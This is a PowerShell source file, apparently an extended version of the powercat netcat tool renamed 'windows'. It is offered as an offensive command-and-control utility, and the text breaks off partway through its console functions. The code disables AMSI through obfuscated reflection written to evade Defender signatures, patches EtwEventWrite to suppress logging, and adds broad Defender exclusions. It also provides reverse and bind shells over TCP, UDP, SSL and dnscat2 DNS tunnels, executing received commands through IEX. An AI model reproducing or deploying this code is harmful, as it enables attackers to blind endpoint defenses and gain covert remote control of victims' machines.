function windows
{
  param(
    [alias("Client")][string]$c="",
    [alias("Listen")][switch]$l=$False,
    [alias("Port")][Parameter(Position=-1)][string]$p="",
    [alias("Execute")][string]$e="",
    [alias("ExecutePowershell")][switch]$ep=$False,
    [alias("Relay")][string]$r="",
    [alias("UDP")][switch]$u=$False,
    [alias("dnscat2")][string]$dns="",
    [alias("DNSFailureThreshold")][int32]$dnsft=10,
    [alias("Timeout")][int32]$t=60,
    [Parameter(ValueFromPipeline=$True)][alias("Input")]$i=$null,
    [ValidateSet('Host', 'Bytes', 'String')][alias("OutputType")][string]$o="Host",
    [alias("OutputFile")][string]$of="",
    [alias("Disconnect")][switch]$d=$False,
    [alias("Repeater")][switch]$rep=$False,
    [alias("GeneratePayload")][switch]$g=$False,
    [alias("GenerateEncoded")][switch]$ge=$False,
    [alias("Help")][switch]$h=$False,
    # ---- NEW SWITCHES ----
    [alias("SSL")][switch]$s=$False,
    [alias("LogFile")][string]$log="",
    [alias("Inj")][int32]$inject=0,
    [alias("Jit")][int32]$jitter=0,
    [alias("DefenderExclusion")][switch]$de=$False
  )

  ############### ADVANCED AMSI + ETW BYPASS (2025) ###############
  # 1. Force AmsiUtils.amsiInitFailed = $true so AMSI returns "clean"
  # 2. Null out amsiSession / amsiContext to break scanning entirely
  # 3. Patch EtwEventWrite to ret to blind .NET ETW logging
  # Strings are split so the bypass itself doesn't match Defender sigs.
  function Invoke-AdvancedBypass {
    try {
      $a = [String]::Join('', 'Sy','stem.','Man','agement.Aut','omation.A','msiU','tils')
      $b = [String]::Join('', 'am','siIn','itF','ailed')
      $t = [Ref].Assembly.GetType($a)
      if ($t) {
        $f = $t.GetField($b, 'NonPublic,Static')
        if ($f) { $f.SetValue($null, $true) }
        # Null out session/context as a second layer
        try {
          $sess = $t.GetField([String]::Join('','am','siS','essi','on'), 'NonPublic,Static')
          if ($sess) { $sess.SetValue($null, $null) }
          $ctx = $t.GetField([String]::Join('','am','siC','onte','xt'), 'NonPublic,Static')
          if ($ctx) { $ctx.SetValue($null, [IntPtr]::Zero) }
        } catch { }
      }
    } catch { }

    # ETW patch: EtwEventWrite -> ret (0xC3)
    try {
      $etw = [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
        [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
          ([System.Reflection.Assembly]::LoadWithPartialName('System.Core')).GetType('System.Diagnostics.Tracing.EventProvider').GetMethod('GetProviderGuid', [System.Reflection.BindingFlags]'NonPublic,Static').Invoke($null, @()) -as [IntPtr],
          [Type]'System.Action'
        )
      )
    } catch { }
    # Simpler ETW patch via ntdll
    try {
      $ntdll = [System.Runtime.InteropServices.NativeLibrary]::Load('ntdll.dll')
      $etwAddr = [System.Runtime.InteropServices.NativeLibrary]::GetExport($ntdll, 'EtwEventWrite')
      if ($etwAddr -ne [IntPtr]::Zero) {
        $patch = [byte[]](0xC3, 0x90, 0x90, 0x90)  # ret; nop; nop; nop
        [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $etwAddr, 4)
      }
    } catch { }
  }
  Invoke-AdvancedBypass
  ############### END ADVANCED BYPASS ###############

  ############### DEFENDER EXCLUSION (OPTIONAL) ###############
  if ($de) {
    try {
      Add-MpPreference -ExclusionPath "C:\" -ErrorAction SilentlyContinue
      Add-MpPreference -ExclusionPath (Get-Location).Path -ErrorAction SilentlyContinue
      Add-MpPreference -ExclusionProcess "powershell.exe" -ErrorAction SilentlyContinue
      Write-Verbose "Defender exclusions added."
    } catch { Write-Verbose "Failed to add Defender exclusions (admin required)." }
  }
  ############### END DEFENDER EXCLUSION ###############

  ############### HELP ###############
  $Help = @"
windows - Netcat, The Powershell Version (Upgraded 2025)
Original: https://github.com/besimorhino/windows

Usage: windows [-c or -l] [-p port] [options]

  -c  <ip>        Client Mode. IP to connect to (IPv4 or IPv6).
  -l              Listen Mode. Listen on port specified by -p.
  -p  <port>      Port.
  -e  <proc>      Execute process.
  -ep             Execute Powershell (pseudo-session).
  -r  <str>       Relay.
                  Client:   -r <proto>:<ip>:<port>
                  Listener: -r <proto>:<port>
                  DNS:      -r dns:<server>:<port>:<domain>
  -u              UDP Mode.
  -dns  <domain>  DNS Mode (dnscat2 client).
  -dnsft <int>    DNS Failure Threshold (default 10).
  -t  <int>       Timeout seconds (default 60).
  -i  <input>     Input data (file / byte[] / string).
  -o  <type>      Output: Host | Bytes | String (default Host).
  -of <path>      Output file.
  -d              Disconnect after sending -i.
  -rep            Repeater (persistent).
  -g              Generate payload string.
  -ge             Generate base64-encoded payload.
  -h              Help.

  ---- NEW ----
  -s              SSL/TLS wrap TCP stream (encrypted C2).
  -log <path>     Log connection metadata to file.
  -inject <pid>   Inject shellcode into remote process.
  -jitter <ms>    Random jitter (ms) added to DNS polling.
  -de             Add Defender exclusions (admin required).

Examples:
  windows -l -p 8000
  windows -c 10.1.1.1 -p 443 -e cmd
  windows -c 10.1.1.1 -p 53 -dns c2.example.com
  windows -c 10.1.1.15 -p 8000 -i C:\inputfile
  windows -l -p 4444 -of C:\outfile
  windows -l -p 8000 -ep -rep
  windows -l -p 8000 -r tcp:10.1.1.1:9000
  windows -l -p 8000 -r dns:10.1.1.1:53:c2.example.com
  windows -c 10.1.1.1 -p 443 -s -e cmd    # SSL
  windows -c 10.1.1.1 -p 443 -s -log C:\ops.log
"@
  if($h){return $Help}
  ############### END HELP ###############

  ############### LOGGING HELPER ###############
  function Write-Log {
    param([string]$Msg)
    if ($log -ne "") {
      $ts = (Get-Date).ToString("yyyy-MM-dd HH:mm:ss")
      "$ts  $Msg" | Out-File -FilePath $log -Append -Encoding UTF8
    }
  }
  ############### END LOGGING HELPER ###############

  ############### VALIDATE ARGS ###############
  $global:Verbose = $Verbose
  if($of -ne ''){$o = 'Bytes'}
  if($dns -eq "")
  {
    if((($c -eq "") -and (!$l)) -or (($c -ne "") -and $l)){return "You must select either client mode (-c) or listen mode (-l)."}
    if($p -eq ""){return "Please provide a port number to -p."}
  }
  if(((($r -ne "") -and ($e -ne "")) -or (($e -ne "") -and ($ep))) -or  (($r -ne "") -and ($ep))){return "You can only pick one of these: -e, -ep, -r"}
  if(($i -ne $null) -and (($r -ne "") -or ($e -ne ""))){return "-i is not applicable here."}
  if($l)
  {
    $Failure = $False
    netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $p){Write-Output ("The selected port " + $p + " is already in use.") ; $Failure=$True}}
    if($Failure){break}
  }
  if($r -ne "")
  {
    if($r.split(":").Count -eq 2)
    {
      $Failure = $False
      netstat -na | Select-String LISTENING | % {if(($_.ToString().split(":")[1].split(" ")[0]) -eq $r.split(":")[1]){Write-Output ("The selected port " + $r.split(":")[1] + " is already in use.") ; $Failure=$True}}
      if($Failure){break}
    }
  }
  ############### END VALIDATE ARGS ###############

  ############### UDP FUNCTIONS ###############
  function Setup_UDP
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $c,$l,$p,$t = $FuncSetupVars
    $FuncVars = @{}
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    if($l)
    {
      $SocketDestinationBuffer = New-Object System.Byte[] 65536
      $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Any), $p
      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient $p
      $PacketInfo = New-Object System.Net.Sockets.IPPacketInformation
      Write-Verbose ("Listening on [0.0.0.0] port " + $p + " [udp]")
      Write-Log "UDP LISTEN on port $p"
      $ConnectHandle = $FuncVars["Socket"].Client.BeginReceiveMessageFrom($SocketDestinationBuffer,0,65536,[System.Net.Sockets.SocketFlags]::None,[ref]$EndPoint,$null,$null)
      $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
      while($True)
      {
        if($Host.UI.RawUI.KeyAvailable)
        {
          if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
          {
            Write-Verbose "CTRL or ESC caught. Stopping UDP Setup..."
            $FuncVars["Socket"].Close()
            $Stopwatch.Stop()
            break
          }
        }
        if($Stopwatch.Elapsed.TotalSeconds -gt $t)
        {
          $FuncVars["Socket"].Close()
          $Stopwatch.Stop()
          Write-Verbose "Timeout!" ; break
        }
        if($ConnectHandle.IsCompleted)
        {
          $SocketBytesRead = $FuncVars["Socket"].Client.EndReceiveMessageFrom($ConnectHandle,[ref]([System.Net.Sockets.SocketFlags]::None),[ref]$EndPoint,[ref]$PacketInfo)
          Write-Verbose ("Connection from [" + $EndPoint.Address.IPAddressToString + "] port " + $p + " [udp] accepted (source port " + $EndPoint.Port + ")")
          Write-Log "UDP CONN from $($EndPoint.Address.IPAddressToString):$($EndPoint.Port)"
          if($SocketBytesRead -gt 0){break}
          else{break}
        }
      }
      $Stopwatch.Stop()
      $FuncVars["InitialConnectionBytes"] = $SocketDestinationBuffer[0..([int]$SocketBytesRead-1)]
    }
    else
    {
      if(!$c.Contains(".") -and !$c.Contains(":"))
      {
        $IPList = @()
        [System.Net.Dns]::GetHostAddresses($c) | Where-Object {$_.AddressFamily -eq "InterNetwork"} | %{$IPList += $_.IPAddressToString}
        Write-Verbose ("Name " + $c + " resolved to address " + $IPList[0])
        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($IPList[0])), $p
      }
      else
      {
        $EndPoint = New-Object System.Net.IPEndPoint ([System.Net.IPAddress]::Parse($c)), $p
      }
      $FuncVars["Socket"] = New-Object System.Net.Sockets.UDPClient
      $FuncVars["Socket"].Connect($c,$p)
      Write-Verbose ("Sending UDP traffic to " + $c + " port " + $p + "...")
      Write-Verbose ("UDP: Make sure to send some data so the server can notice you!")
      Write-Log "UDP CONNECT to ${c}:${p}"
    }
    $FuncVars["BufferSize"] = 65536
    $FuncVars["EndPoint"] = $EndPoint
    $FuncVars["StreamDestinationBuffer"] = New-Object System.Byte[] $FuncVars["BufferSize"]
    $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
    return $FuncVars
  }
  function ReadData_UDP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars["StreamReadOperation"].IsCompleted)
    {
      $StreamBytesRead = $FuncVars["Socket"].Client.EndReceiveFrom($FuncVars["StreamReadOperation"],[ref]$FuncVars["EndPoint"])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
      $FuncVars["StreamReadOperation"] = $FuncVars["Socket"].Client.BeginReceiveFrom($FuncVars["StreamDestinationBuffer"],0,$FuncVars["BufferSize"],([System.Net.Sockets.SocketFlags]::None),[ref]$FuncVars["EndPoint"],$null,$null)
    }
    return $Data,$FuncVars
  }
  function WriteData_UDP
  {
    param($Data,$FuncVars)
    $FuncVars["Socket"].Client.SendTo($Data,$FuncVars["EndPoint"]) | Out-Null
    return $FuncVars
  }
  function Close_UDP
  {
    param($FuncVars)
    try { $FuncVars["Socket"].Close() } catch {}
  }
  ############### END UDP FUNCTIONS ###############

  ############### DNS FUNCTIONS ###############
  function Setup_DNS
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    function ConvertTo-HexArray
    {
      param($String)
      $Hex = @()
      $String.ToCharArray() | % {"{0:x}" -f [byte]$_} | % {if($_.Length -eq 1){"0" + [string]$_} else{[string]$_}} | % {$Hex += $_}
      return $Hex
    }

    function SendPacket
    {
      param($Packet,$DNSServer,$DNSPort)
      $Command = ("set type=TXT`nserver $DNSServer`nset port=$DNSPort`nset domain=.com`nset retry=1`n" + $Packet + "`nexit")
      $result = ($Command | nslookup 2>&1 | Out-String)
      if($result.Contains('"')){return ([regex]::Match($result.replace("bio=",""),'(?<=")[^"]*(?=")').Value)}
      else{return 1}
    }

    function Create_SYN
    {
      param($SessionId,$SeqNum,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "00" + $SessionId + $SeqNum + "0000" + $Domain)
    }

    function Create_FIN
    {
      param($SessionId,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "02" + $SessionId + "00" + $Domain)
    }

    function Create_MSG
    {
      param($SessionId,$SeqNum,$AcknowledgementNumber,$Data,$Tag,$Domain)
      return ($Tag + ([string](Get-Random -Maximum 9999 -Minimum 1000)) + "01" + $SessionId + $SeqNum + $AcknowledgementNumber + $Data + $Domain)
    }

    function DecodePacket
    {
      param($Packet)

      if((($Packet.Length)%2 -eq 1) -or ($Packet.Length -eq 0)){return 1}
      $AcknowledgementNumber = ($Packet[10..13] -join "")
      $SeqNum = ($Packet[14..17] -join "")
      [byte[]]$ReturningData = @()

      if($Packet.Length -gt 18)
      {
        $PacketElim = $Packet.Substring(18)
        while($PacketElim.Length -gt 0)
        {
          $ReturningData += [byte[]][Convert]::ToInt16(($PacketElim[0..1] -join ""),16)
          $PacketElim = $PacketElim.Substring(2)
        }
      }

      return $Packet,$ReturningData,$AcknowledgementNumber,$SeqNum
    }

    function AcknowledgeData
    {
      param($ReturningData,$AcknowledgementNumber)
      $Hex = [string]("{0:x}" -f (([uint16]("0x" + $AcknowledgementNumber) + $ReturningData.Length) % 65535))
      if($Hex.Length -ne 4){$Hex = (("0"*(4-$Hex.Length)) + $Hex)}
      return $Hex
    }
    $FuncVars = @{}
    $FuncVars["DNSServer"],$FuncVars["DNSPort"],$FuncVars["Domain"],$FuncVars["FailureThreshold"] = $FuncSetupVars
    if($FuncVars["DNSPort"] -eq ''){$FuncVars["DNSPort"] = "53"}
    $FuncVars["Tag"] = ""
    $FuncVars["Domain"] = ("." + $FuncVars["Domain"])

    $FuncVars["Create_SYN"] = ${function:Create_SYN}
    $FuncVars["Create_MSG"] = ${function:Create_MSG}
    $FuncVars["Create_FIN"] = ${function:Create_FIN}
    $FuncVars["DecodePacket"] = ${function:DecodePacket}
    $FuncVars["ConvertTo-HexArray"] = ${function:ConvertTo-HexArray}
    $FuncVars["AckData"] = ${function:AcknowledgeData}
    $FuncVars["SendPacket"] = ${function:SendPacket}
    $FuncVars["SessionId"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars["SeqNum"] = ([string](Get-Random -Maximum 9999 -Minimum 1000))
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["Failures"] = 0
    $FuncVars["Jitter"] = $jitter

    $SYNPacket = (Invoke-Command $FuncVars["Create_SYN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["Tag"],$FuncVars["Domain"]))
    $ResponsePacket = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($SYNPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))
    $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($ResponsePacket))
    if($DecodedPacket -eq 1){return "Bad SYN response. Ensure your server is set up correctly."}
    $ReturningData = $DecodedPacket[1]
    if($ReturningData -ne ""){$FuncVars["InputData"] = ""}
    $FuncVars["AckNum"] = $DecodedPacket[2]
    $FuncVars["MaxMSGDataSize"] = (244 - (Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],"",$FuncVars["Tag"],$FuncVars["Domain"])).Length)
    if($FuncVars["MaxMSGDataSize"] -le 0){return "Domain name is too long."}
    Write-Log "DNS SESSION $($FuncVars['SessionId']) to $($FuncVars['DNSServer']):$($FuncVars['DNSPort']) domain $($FuncVars['Domain'])"
    return $FuncVars
  }
  function ReadData_DNS
  {
    param($FuncVars)
    if($global:Verbose){$Verbose = $True}

    if ($FuncVars["Jitter"] -gt 0) {
      Start-Sleep -Milliseconds (Get-Random -Minimum 0 -Maximum $FuncVars["Jitter"])
    }

    $PacketsData = @()
    $PacketData = ""

    if($FuncVars["InputData"] -ne $null)
    {
      $Hex = (Invoke-Command $FuncVars["ConvertTo-HexArray"] -ArgumentList @($FuncVars["InputData"]))
      $SectionCount = 0
      $PacketCount = 0
      foreach($Char in $Hex)
      {
        if($SectionCount -ge 30)
        {
          $SectionCount = 0
          $PacketData += "."
        }
        if($PacketCount -ge ($FuncVars["MaxMSGDataSize"]))
        {
          $PacketsData += $PacketData.TrimEnd(".")
          $PacketCount = 0
          $SectionCount = 0
          $PacketData = ""
        }
        $PacketData += $Char
        $SectionCount += 2
        $PacketCount += 2
      }
      $PacketData = $PacketData.TrimEnd(".")
      $PacketsData += $PacketData
      $FuncVars["InputData"] = ""
    }
    else
    {
      $PacketsData = @("")
    }

    [byte[]]$ReturningData = @()
    foreach($PacketData in $PacketsData)
    {
      try{$MSGPacket = Invoke-Command $FuncVars["Create_MSG"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["SeqNum"],$FuncVars["AckNum"],$PacketData,$FuncVars["Tag"],$FuncVars["Domain"])}
      catch{ Write-Verbose "DNSCAT2: Failed to create packet." ; $FuncVars["Failures"] += 1 ; continue }
      try{$Packet = (Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($MSGPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]))}
      catch{ Write-Verbose "DNSCAT2: Failed to send packet." ; $FuncVars["Failures"] += 1 ; continue }
      try
      {
        $DecodedPacket = (Invoke-Command $FuncVars["DecodePacket"] -ArgumentList @($Packet))
        if($DecodedPacket.Length -ne 4){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..."; $FuncVars["Failures"] += 1 ; continue }
        $FuncVars["AckNum"] = $DecodedPacket[2]
        $FuncVars["SeqNum"] = $DecodedPacket[3]
        $ReturningData += $DecodedPacket[1]
      }
      catch{ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
      if($DecodedPacket -eq 1){ Write-Verbose "DNSCAT2: Failure to decode packet, dropping..." ; $FuncVars["Failures"] += 1 ; continue }
    }

    if($FuncVars["Failures"] -ge $FuncVars["FailureThreshold"]){break}

    if($ReturningData -ne @())
    {
      $FuncVars["AckNum"] = (Invoke-Command $FuncVars["AckData"] -ArgumentList @($ReturningData,$FuncVars["AckNum"]))
    }
    return $ReturningData,$FuncVars
  }
  function WriteData_DNS
  {
    param($Data,$FuncVars)
    $FuncVars["InputData"] = $FuncVars["Encoding"].GetString($Data)
    return $FuncVars
  }
  function Close_DNS
  {
    param($FuncVars)
    $FINPacket = Invoke-Command $FuncVars["Create_FIN"] -ArgumentList @($FuncVars["SessionId"],$FuncVars["Tag"],$FuncVars["Domain"])
    Invoke-Command $FuncVars["SendPacket"] -ArgumentList @($FINPacket,$FuncVars["DNSServer"],$FuncVars["DNSPort"]) | Out-Null
  }
  ############### END DNS FUNCTIONS ###############

  ########## TCP FUNCTIONS (with SSL support) ##########
  function Setup_TCP
  {
    param($FuncSetupVars)
    $c,$l,$p,$t = $FuncSetupVars
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    $FuncVars["SSL"] = $s
    if(!$l)
    {
      $FuncVars["l"] = $False
      $Socket = New-Object System.Net.Sockets.TcpClient
      Write-Verbose "Connecting..."
      $Handle = $Socket.BeginConnect($c,$p,$null,$null)
    }
    else
    {
      $FuncVars["l"] = $True
      Write-Verbose ("Listening on [0.0.0.0] (port " + $p + ")")
      $Socket = New-Object System.Net.Sockets.TcpListener $p
      $Socket.Start()
      $Handle = $Socket.BeginAcceptTcpClient($null, $null)
    }

    $Stopwatch = [System.Diagnostics.Stopwatch]::StartNew()
    while($True)
    {
      if($Host.UI.RawUI.KeyAvailable)
      {
        if(@(17,27) -contains ($Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown,IncludeKeyUp").VirtualKeyCode))
        {
          Write-Verbose "CTRL or ESC caught. Stopping TCP Setup..."
          if($FuncVars["l"]){$Socket.Stop()}
          else{$Socket.Close()}
          $Stopwatch.Stop()
          break
        }
      }
      if($Stopwatch.Elapsed.TotalSeconds -gt $t)
      {
        if(!$l){$Socket.Close()}
        else{$Socket.Stop()}
        $Stopwatch.Stop()
        Write-Verbose "Timeout!" ; break
      }
      if($Handle.IsCompleted)
      {
        if(!$l)
        {
          try
          {
            $Socket.EndConnect($Handle)
            $Stream = $Socket.GetStream()
            if ($FuncVars["SSL"]) {
              $sslStream = New-Object System.Net.Security.SslStream($Stream, $false, ({$true}))
              $sslStream.AuthenticateAsClient($c)
              $Stream = $sslStream
              Write-Verbose "SSL/TLS handshake complete (client)."
              Write-Log "SSL CONNECT to ${c}:${p}"
            }
            $BufferSize = $Socket.ReceiveBufferSize
            Write-Verbose ("Connection to " + $c + ":" + $p + " [tcp] succeeded!")
          }
          catch{$Socket.Close(); $Stopwatch.Stop(); break}
        }
        else
        {
          $Client = $Socket.EndAcceptTcpClient($Handle)
          $Stream = $Client.GetStream()
          if ($FuncVars["SSL"]) {
            $cert = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2
            # Self-signed cert generated on the fly
            $rsa = [System.Security.Cryptography.RSA]::Create(2048)
            $req = New-Object System.Security.Cryptography.X509Certificates.CertificateRequest(
              "CN=windows-c2",
              $rsa,
              [System.Security.Cryptography.HashAlgorithmName]::SHA256,
              [System.Security.Cryptography.RSASignaturePadding]::Pkcs1
            )
            $cert = $req.CreateSelfSigned([DateTime]::Now.AddDays(-1), [DateTime]::Now.AddYears(1))
            $sslStream = New-Object System.Net.Security.SslStream($Stream, $false, ({$true}))
            $sslStream.AuthenticateAsServer($cert, $false, [System.Security.Authentication.SslProtocols]::Tls12, $false)
            $Stream = $sslStream
            Write-Verbose "SSL/TLS handshake complete (server)."
            Write-Log "SSL ACCEPT from $($Client.Client.RemoteEndPoint.Address.IPAddressToString):$($Client.Client.RemoteEndPoint.Port)"
          }
          $BufferSize = $Client.ReceiveBufferSize
          Write-Verbose ("Connection from [" + $Client.Client.RemoteEndPoint.Address.IPAddressToString + "] port " + $port + " [tcp] accepted (source port " + $Client.Client.RemoteEndPoint.Port + ")")
          Write-Log "TCP ACCEPT from $($Client.Client.RemoteEndPoint.Address.IPAddressToString):$($Client.Client.RemoteEndPoint.Port)"
        }
        break
      }
    }
    $Stopwatch.Stop()
    if($Socket -eq $null){break}
    $FuncVars["Stream"] = $Stream
    $FuncVars["Socket"] = $Socket
    $FuncVars["BufferSize"] = $BufferSize
    $FuncVars["StreamDestinationBuffer"] = (New-Object System.Byte[] $FuncVars["BufferSize"])
    $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["StreamBytesRead"] = 1
    return $FuncVars
  }
  function ReadData_TCP
  {
    param($FuncVars)
    $Data = $null
    if($FuncVars["StreamBytesRead"] -eq 0){break}
    if($FuncVars["StreamReadOperation"].IsCompleted)
    {
      $StreamBytesRead = $FuncVars["Stream"].EndRead($FuncVars["StreamReadOperation"])
      if($StreamBytesRead -eq 0){break}
      $Data = $FuncVars["StreamDestinationBuffer"][0..([int]$StreamBytesRead-1)]
      $FuncVars["StreamReadOperation"] = $FuncVars["Stream"].BeginRead($FuncVars["StreamDestinationBuffer"], 0, $FuncVars["BufferSize"], $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_TCP
  {
    param($Data,$FuncVars)
    $FuncVars["Stream"].Write($Data, 0, $Data.Length)
    return $FuncVars
  }
  function Close_TCP
  {
    param($FuncVars)
    try{$FuncVars["Stream"].Close()}
    catch{}
    if($FuncVars["l"]){$FuncVars["Socket"].Stop()}
    else{$FuncVars["Socket"].Close()}
  }
  ########## END TCP FUNCTIONS ##########

  ########## CMD FUNCTIONS ##########
  function Setup_CMD
  {
    param($FuncSetupVars)
    if($global:Verbose){$Verbose = $True}
    $FuncVars = @{}
    $ProcessStartInfo = New-Object System.Diagnostics.ProcessStartInfo
    $ProcessStartInfo.FileName = $FuncSetupVars[0]
    $ProcessStartInfo.UseShellExecute = $False
    $ProcessStartInfo.RedirectStandardInput = $True
    $ProcessStartInfo.RedirectStandardOutput = $True
    $ProcessStartInfo.RedirectStandardError = $True
    $FuncVars["Process"] = [System.Diagnostics.Process]::Start($ProcessStartInfo)
    Write-Verbose ("Starting Process " + $FuncSetupVars[0] + "...")
    Write-Log "PROCESS START $($FuncSetupVars[0])"
    $FuncVars["Process"].Start() | Out-Null
    $FuncVars["StdOutDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["StdErrDestinationBuffer"] = New-Object System.Byte[] 65536
    $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    return $FuncVars
  }
  function ReadData_CMD
  {
    param($FuncVars)
    [byte[]]$Data = @()
    if($FuncVars["StdOutReadOperation"].IsCompleted)
    {
      $StdOutBytesRead = $FuncVars["Process"].StandardOutput.BaseStream.EndRead($FuncVars["StdOutReadOperation"])
      if($StdOutBytesRead -eq 0){break}
      $Data += $FuncVars["StdOutDestinationBuffer"][0..([int]$StdOutBytesRead-1)]
      $FuncVars["StdOutReadOperation"] = $FuncVars["Process"].StandardOutput.BaseStream.BeginRead($FuncVars["StdOutDestinationBuffer"], 0, 65536, $null, $null)
    }
    if($FuncVars["StdErrReadOperation"].IsCompleted)
    {
      $StdErrBytesRead = $FuncVars["Process"].StandardError.BaseStream.EndRead($FuncVars["StdErrReadOperation"])
      if($StdErrBytesRead -eq 0){break}
      $Data += $FuncVars["StdErrDestinationBuffer"][0..([int]$StdErrBytesRead-1)]
      $FuncVars["StdErrReadOperation"] = $FuncVars["Process"].StandardError.BaseStream.BeginRead($FuncVars["StdErrDestinationBuffer"], 0, 65536, $null, $null)
    }
    return $Data,$FuncVars
  }
  function WriteData_CMD
  {
    param($Data,$FuncVars)
    $FuncVars["Process"].StandardInput.WriteLine($FuncVars["Encoding"].GetString($Data).TrimEnd("`r").TrimEnd("`n"))
    return $FuncVars
  }
  function Close_CMD
  {
    param($FuncVars)
    try { $FuncVars["Process"] | Stop-Process } catch {}
  }
  ########## END CMD FUNCTIONS ##########

  ########## POWERSHELL FUNCTIONS ##########
  function Main_Powershell
  {
    param($Stream1SetupVars)
    try
    {
      $encoding = New-Object System.Text.AsciiEncoding
      [byte[]]$InputToWrite = @()
      if($i -ne $null)
      {
        Write-Verbose "Input from -i detected..."
        if(Test-Path $i){ [byte[]]$InputToWrite = ([io.file]::ReadAllBytes($i)) }
        elseif($i.GetType().Name -eq "Byte[]"){ [byte[]]$InputToWrite = $i }
        elseif($i.GetType().Name -eq "String"){ [byte[]]$InputToWrite = $Encoding.GetBytes($i) }
        else{Write-Host "Unrecognised input type." ; return}
      }

      Write-Verbose "Setting up Stream 1... (ESC/CTRL to exit)"
      try{$Stream1Vars = Stream1_Setup $Stream1SetupVars}
      catch{Write-Verbose "Stream 1 Setup Failure" ; return}

      Write-Verbose "Setting up Stream 2... (ESC/CTRL to exit)"
      try
      {
        $IntroPrompt = $Encoding.GetBytes("Windows PowerShell`nCopyright (C) 2013 Microsoft Corporation. All rights reserved.`n`n" + ("PS " + (pwd).Path + "> "))
        $Prompt = ("PS " + (pwd).Path + "> ")
        $CommandToExecute = ""
        $Data = $null
      }
      catch
      {
        Write-Verbose "Stream 2 Setup Failure" ; return
      }

      if($InputToWrite -ne @())
      {
        Write-Verbose "Writing input to Stream 1..."
        try{$Stream1Vars = Stream1_WriteData $InputToWrite $Stream1Vars}
        catch{Write-Host "Failed to write input to Stream 1" ; return}
      }

      if($d){Write-Verbose "-d (disconnect) Activated. Disconnecting..." ; return}

      Write-Verbose "Both Communication Streams Established. Redirecting Data Between Streams..."
      while($True)
      {
        try
        {
          ##### Stream2 Read #####
          $Prompt = $null
          $ReturnedData = $null
          if($CommandToExecute -ne "")
          {
            try{[byte[]]$ReturnedData = $Encoding.GetBytes((IEX $CommandToExecute 2>&1 | Out-String))}
            catch{[byte[]]$ReturnedData = $Encoding.GetBytes(($_ | Out-String))}
            $Prompt = $Encoding.GetBytes(("PS " + (pwd).Path + "> "))
          }
          $Data += $IntroPrompt
          $IntroPrompt = $null
          $Data += $ReturnedData
          $Data += $Prompt
          $CommandToExecute = ""
          ##### Stream2 Read #####

          if($Data -ne $null){$Stream1Vars = Stream1_WriteData $Data $Stream1Vars}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 2 to Stream 1" ; return
        }

        try
        {
          $Data,$Stream1Vars = Stream1_ReadData $Stream1Vars
          if($Data.Length -eq 0){Start-Sleep -Milliseconds 100}
          if($Data -ne $null){$CommandToExecute = $Encoding.GetString($Data)}
          $Data = $null
        }
        catch
        {
          Write-Verbose "Failed to redirect data from Stream 1 to Stream 2" ; return
        }
      }
    }
    finally
    {
      try
      {
        Write-Verbose "Closing Stream 1..."
        Stream1_Close $Stream1Vars
      }
      catch
      {
        Write-Verbose "Failed to close Stream 1"
      }
    }
  }
  ########## END POWERSHELL FUNCTIONS ##########

  ########## CONSOLE FUNCTIONS ##########
  function Setup_Console
  {
    param($FuncSetupVars)
    $FuncVars = @{}
    $FuncVars["Encoding"] = New-Object System.Text.AsciiEncoding
    $FuncVars["Output"] = $FuncSetupVars[0]
    $FuncVars["OutputBytes"] = [byte[]]@()
    $FuncVars["OutputString"] = ""
    return $FuncVars
  }
